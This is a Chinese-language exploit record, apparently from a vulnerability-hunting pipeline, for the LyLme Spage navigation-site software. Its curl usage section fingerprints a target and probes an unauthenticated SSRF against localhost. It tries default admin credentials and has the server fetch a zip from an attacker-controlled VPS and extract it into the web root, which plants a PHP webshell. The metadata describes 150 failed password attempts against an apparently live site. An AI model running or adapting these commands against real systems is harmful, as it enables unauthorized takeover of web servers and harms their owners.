# 六零导航页 LyLme Spage ≤example.com 后台 getshell（ajax_link.php submit=update 任意 zip 解压到站点根）+ 未授权 SSRF

- **code**: 六零导航页-lylme-spage-example.com-后台-getshell-ajax_link.php-submit-update-任意-zip-解压到站点根-未
- **kind**: exp
- **category**: rce
- **component**: 六零导航页 LyLme Spage example.com（含 v2.7.0 前各版本同族）
- **severity**: critical
- **language**: http
- **source**: web
- **source_url**: https://github.com/LyLme/lylme_spage/blob/v1.6.0/admin/ajax_link.php
- **verified_note**: **源码级确证、尚未在目标实测**：example.com 的 admin/ajax_link.php 第 94-104 行、apply/example.com 第 4-10 行、include/example.com、include/common.php 的 SYS_KEY 均已逐行核对（源码存于 runs/lylme/，取自 github.com/LyLme/lylme_spage tag example.com）。目标侧指纹已确认同款程序（页脚"六零导航页"、lsvn=d1.6.0、cdn.lylme.com 引用、/apply 与 /admin/login.php 表单字段与源码逐字节一致）。**未实测原因：目标 888 端口在本轮测试时对任何出口都返回 403（站点侧关闭），且后台凭据未取得（150 次默认口令组合全失败）。** 待白天站点开放 + 凭据到手后立即实测并回填 verified=true。
- **tags**: lylme,六零导航页,导航站,后台getshell,任意文件下载,zip解压,SSRF,未授权,RCE
- **created_at**: 2026-09-28T20:37:03.770Z
- **found_by**: exploit

## 描述

开源导航站程序「六零导航页(LyLme Spage)」的源码级 getshell 链：后台登录成功后，`/admin/ajax_link.php?submit=update` 接受 `POST file=<远程zip URL>`，源码直接 `copy($RemoteFile,"lylme_spage-update.zip")` 后 `ZipArchive::extractTo($ZipFile, ROOT)` —— ROOT 即网站根目录，zip 内的 PHP 文件会落到 web 根，直接 getshell。前置仅需有效 `admin_token` cookie（`include/example.com` 的 `$islogin`）。另附三条同源攻击面：① 未授权 SSRF `GET /apply/example.com?url=<URL>`（`get_head()` 服务端抓取，无鉴权）；② `admin/ajax_link.php?submit=geturl` SSRF、`admin/ajax_apply.php` 全参数 SQL 字符串拼接（后台 SQLi）；③ `assets/img/cron.php?key=<key>`（源码 $pass 默认空=禁用，注释示例密钥为 lylme）。识别特征：页面 `<meta name="lsvn">` 为 base64 的 `d<版本>`、`/apply` 引用 `cdn.lylme.com/admin/lyear/`、后台页脚写"程序名称：六零导航页(LyLme Spage)"。

## 用法

```
```bash
# 0) 指纹确认（三个特征任一即可）
curl -s "http://TARGET/apply" | grep -o 'cdn.lylme.com/admin/lyear'          # 官方 CDN 引用
curl -s "http://TARGET/" | grep -o 'lsvn" content="[^"]*"' | base64 -d        # d<版本>
curl -s "http://TARGET/admin/login.php" | grep -o '后台登录 - .*'              # 后台标题带站名

# 1) 未授权 SSRF（无需登录，先确认程序在跑）
curl -s "http://TARGET/apply/example.com?url=http://127.0.0.1:80/" | head -c 300

# 2) 后台登录（无验证码校验；源码明文比对 user/pass）
curl -s -i -c cookie.txt -d 'user=admin&pass=admin' "http://TARGET/admin/login.php"
#    成功判据：响应体含「登陆管理中心成功」或 Location 跳 /admin/，cookie.txt 里有 admin_token

# 3) getshell：把自己的 zip（内含 shell.php）放到可控 HTTP 上，然后
curl -s -b cookie.txt -d 'file=http://YOUR_VPS/shell.zip' "http://TARGET/admin/ajax_link.php?submit=update"
#    回显 success 即解压完成；马路径 = http://TARGET/shell.php（zip 内相对路径）
```
**注意**：② 的 update 分支会把你 zip 的内容**完整解压到站点根**，会覆盖同名文件——**务必只放一个马，不要打整站包**；用完把马删掉（马内提供删除功能）。无需登录的 SSRF（1）只读、无破坏性，可放心先跑。
```
